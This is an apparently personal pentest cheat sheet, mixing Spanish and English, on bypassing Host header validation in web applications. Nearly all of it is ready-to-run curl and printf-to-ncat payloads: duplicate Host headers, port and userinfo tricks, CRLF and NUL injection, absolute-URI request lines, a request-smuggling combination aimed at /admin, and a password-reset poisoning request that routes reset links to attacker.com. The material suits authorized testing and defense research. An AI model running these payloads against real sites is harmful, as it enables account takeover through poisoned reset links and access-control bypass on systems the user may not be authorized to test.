---
aliases:
  - HHI Bypass
  - Host Header Validation Bypass
  - Multiple Host Headers
tags:
  - type/technique
  - vuln/host-header-injection
  - technique/defense-evasion
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Host Header Injection]]"
---
# Host Header Injection - Bypass de Validación

***

## Multiple Host Headers

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf 'GET / HTTP/1.1\r\nHost: target.com\r\nHost: attacker.com\r\n\r\n' \| ncat target.com 80` | Doble Host — frontend/backend toma distintos | Parsers laxos. |
| `curl --http1.1 -H "Host: target.com" -H "Host: attacker.com" https://target/` (curl envía último) | Curl normaliza — frontend/backend differential test | Quick test. |
| `printf 'GET / HTTP/1.1\r\nhost: attacker.com\r\nHost: target.com\r\n\r\n' \| ncat target 80` | Case differential — separate keys? | Header parser case behavior. |
| `curl --http2 -H ":authority: target.com" -H "Host: attacker.com" https://target/` | HTTP/2 `:authority` vs Host differential | H2-specific. |
| `printf 'GET / HTTP/1.1\r\nHost: target.com\r\nX-Forwarded-Host: attacker.com\r\n\r\n' \| ncat target 80` | Frontend uses Host, backend uses XFH | Reverse proxy desync. |
| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: attacker.com\r\n\r\n' \| ncat target 80` | HRS combo smuggling Host | HRS + HHI. |
^hhi-bypass-multiple

___

## Port Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "Host: target.com:1337" https://target/` | Bypass simple Host validation | Filter strict en hostname only. |
| `curl -H "Host: target.com:0" https://target/` | Port 0 — parsers interpret distinto | Edge parser behavior. |
| `curl -H "Host: target.com:-1" https://target/` | Negative port | Some parsers fail-open. |
| `curl -H "Host: target.com:80:80" https://target/` | Doble port | Server parser tolerance. |
| `curl -H "Host: :1337" https://target/` | Empty hostname con port | Edge case. |
| `curl -H "Host: target.com:80@attacker.com" https://target/` | Userinfo trick — host real es attacker | Parser ignora userinfo. |
| `curl -H "Host: https://attacker.com:1337" https://target/` | Absolute URL en Host | Some parsers accept. |
^hhi-bypass-port

___

## Indentation / Whitespace

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf 'GET / HTTP/1.1\r\nHost: target.com\r\n attacker.com\r\n\r\n' \| ncat target 80` | Folded header (RFC obsolete) | Algunos parsers aceptan continuation. |
| `printf 'GET / HTTP/1.1\r\nHost:\ttarget.com\r\n\r\n' \| ncat target 80` | Tab indentation | Whitespace tolerance. |
| `printf 'GET / HTTP/1.1\r\nHost:  attacker.com\r\n\r\n' \| ncat target 80` | Multi-space leading | Standard tolerated. |
| `printf 'GET / HTTP/1.1\r\nHost: target.com\rattacker.com\r\n\r\n' \| ncat target 80` | CR within Host (CRLF injection) | Header injection adjacent. |
| `printf 'GET / HTTP/1.1\r\nHost: target.com\x00attacker.com\r\n\r\n' \| ncat target 80` | NUL byte truncation | Parser truncate-on-NUL. |
| `printf 'GET / HTTP/1.1\r\nHost: target.com\x0battacker.com\r\n\r\n' \| ncat target 80` | Vertical tab | Edge whitespace. |
| `printf 'GET / HTTP/1.1\r\nHost: target.com\r\n\r\nGET /admin HTTP/1.1\r\n\r\n' \| ncat target 80` | Double CRLF truncate (HRS adjacent) | Smuggling combo. |
^hhi-bypass-whitespace

___

## Absolute URL en Request Line

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf 'GET https://attacker.com/path HTTP/1.1\r\nHost: target.com\r\n\r\n' \| ncat target 80` | absoluteURI form — backend usa URL host vs Host header | RFC 7230 proxy-style request. |
| `printf 'GET https://user:pass@attacker.com/ HTTP/1.1\r\nHost: target.com\r\n\r\n' \| ncat target 80` | Userinfo en absolute URL | Parser confusion. |
| `printf 'GET https://attacker%%2Ecom/ HTTP/1.1\r\nHost: target.com\r\n\r\n' \| ncat target 80` | Encoded chars en URL host | Decode-after-validate. |
| `curl --http2 --request-target "https://attacker.com/" https://target/` | HTTP/2 :path absolute | H2 variant. |
| `printf 'GET https://target.com//admin HTTP/1.1\r\nHost: target.com\r\n\r\n' \| ncat target 80` | Multiple slashes — path normalization differential | Path traversal-adjacent. |
^hhi-bypass-absolute

___

## Path Injection en Host

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "Host: target.com/admin" https://target/` | Path en Host header | Parser split en `/`. |
| `curl -H "Host: target.com/path?injected=1" https://target/` | Query injection en Host | Reflected en URL construct. |
| `curl -H "Host: target.com#evil" https://target/` | Fragment en Host | Parser ignora fragment? |
| `curl -H "Host: target.com@attacker.com" https://target/` | Userinfo confusion | Userinfo trick. |
| `curl -H "Host: target%2Ecom" https://target/` | Encoded chars | URL decode. |
| `curl -H 'Host: target.com\path' https://target/` | Backslash en Host | Backslash interpretation. |
| `curl -X POST -H "Host: target.com#@attacker.com" -d "email=victim" https://target/forgot` | Combo HHI + Open Redirect via reflected base href | XSS-adjacent via reflection. |
^hhi-bypass-path

***
